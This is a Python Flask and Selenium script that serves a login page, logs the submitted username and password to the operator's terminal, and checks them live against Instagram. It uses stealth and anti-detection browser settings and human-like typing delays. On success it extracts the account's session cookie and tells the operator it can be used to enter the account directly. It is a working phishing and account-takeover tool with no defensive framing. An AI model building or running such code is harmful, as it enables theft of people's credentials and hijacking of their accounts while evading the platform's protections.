import os
import time
import random
from flask import Flask, request, render_template, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium_stealth import stealth
import undetected_chromedriver as uc

app = Flask(__name__)

# --- List of User-Agents (Randomly Choose) ---
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

# --- Instagram Login Checker Function (ANTI-DETECTION) ---
def check_instagram_login(username, password):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)

    # Random user-agent
    chrome_options.add_argument(f"--user-agent={random.choice(user_agents)}")

    # Random viewport
    viewport_width = random.randint(1200, 1920)
    viewport_height = random.randint(800, 1080)
    chrome_options.add_argument(f"--window-size={viewport_width},{viewport_height}")

    # Optional: Add proxy here if you have
    # chrome_options.add_argument("--proxy-server=socks5://127.0.0.1:9050")

    try:
        driver = uc.Chrome(version_main=None, options=chrome_options)

        # Apply stealth to make it look like a real human
        stealth(driver,
            languages=["en-US", "en"],
            vendor="Google Inc.",
            platform="Win32",
            webgl_vendor="Intel Inc.",
            renderer="Intel Iris OpenGL Engine",
            fix_hairline=True,
        )

        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    except Exception as e:
        print(f"WebDriver init failed: {e}")
        return {"status": 0, "session_id": None, "error": "Driver setup failed."}

    login_url = "https://www.instagram.com/accounts/login/"
    driver.get(login_url)

    try:
        wait = WebDriverWait(driver, 20)

        username_field = wait.until(EC.presence_of_element_located((By.NAME, 'username')))
        time.sleep(random.uniform(1.0, 2.0))

        password_field = driver.find_element(By.NAME, 'password')

        # Type like a human
        for char in username:
            username_field.send_keys(char)
            time.sleep(random.uniform(0.05, 0.2))
        time.sleep(random.uniform(0.5, 1.0))

        for char in password:
            password_field.send_keys(char)
            time.sleep(random.uniform(0.05, 0.2))
        time.sleep(random.uniform(0.5, 1.0))

        password_field.submit()
        print("Login submitted. Waiting for response...")

        time.sleep(5)  # Give Instagram time to respond

        if "accounts/login" in driver.current_url:
            try:
                error_element = driver.find_element(By.ID, 'slfErrorAlert')
                error_msg = error_element.text if error_element.is_displayed() else "Login failed."
                driver.quit()
                return {"status": 0, "session_id": None, "error": error_msg}
            except:
                try:
                    challenge = driver.find_element(By.XPATH, "//h2[contains(text(), 'Challenge')]") or driver.find_element(By.XPATH, "//div[contains(text(), 'Verify')]")
                    driver.quit()
                    return {"status": 0, "session_id": None, "error": "Challenge required. Instagram blocked the login attempt."}
                except:
                    driver.quit()
                    return {"status": 0, "session_id": None, "error": "Login failed. No clear reason."}

        is_logged_in = False
        try:
            wait.until(EC.element_to_be_clickable((By.XPATH, "//button[text()='Not Now']")))
            is_logged_in = True
        except:
            try:
                wait.until(EC.presence_of_element_located((By.XPATH, "//*[local-name()='svg' and @aria-label='Home']")))
                is_logged_in = True
            except:
                try:
                    wait.until(EC.presence_of_element_located((By.XPATH, "//img[@data-testid='user-avatar']")))
                    is_logged_in = True
                except:
                    pass

        if is_logged_in:
            cookies = driver.get_cookies()
            session_id = None
            for cookie in cookies:
                if cookie['name'] == 'sessionid':
                    session_id = cookie['value']
                    break
            driver.quit()
            return {"status": 1, "session_id": session_id, "error": None}
        else:
            driver.quit()
            return {"status": 0, "session_id": None, "error": "Login failed. Unknown reason."}

    except Exception as e:
        print(f"Exception during login: {e}")
        driver.quit()
        return {"status": 0, "session_id": None, "error": f"Error: {e}"}

# Flask Routes
@app.route('/')
def index():
    return render_template('login.html')

@app.route('/check', methods=['POST'])
def check_credentials():
    username = request.form.get('username')
    password = request.form.get('password')

    print("\n" + "="*30)
    print("New Credentials Received:")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print("="*30 + "\n")

    print("Checking on Instagram... Please wait.")
    result = check_instagram_login(username, password)

    print("\n" + "="*30)
    print("Instagram Login Result:")
    if result['status'] == 1:
        print("Status: 1 (SUCCESS - This data is correct)")
        if result['session_id']:
            print(f"Session ID: {result['session_id']}")
            print("You can use this session ID to go directly to Instagram.")
    else:
        print("Status: 0 (FAILED - This data is incorrect)")
        if result['error']:
            print(f"Reason: {result['error']}")
    print("="*30 + "\n")

    if result['status'] == 1:
        response_message = "Login successful! Check your terminal for details."
    else:
        response_message = "Login failed. The username or password you entered is incorrect."
    return jsonify({
        "message": response_message,
        "status": result['status']
    })

if __name__ == '__main__':
    print("Tool starting...")
    print("Open http://127.0.0.1:5000 in your browser to see the login page.")
    app.run(host='0.0.0.0', port=5000, debug=True)
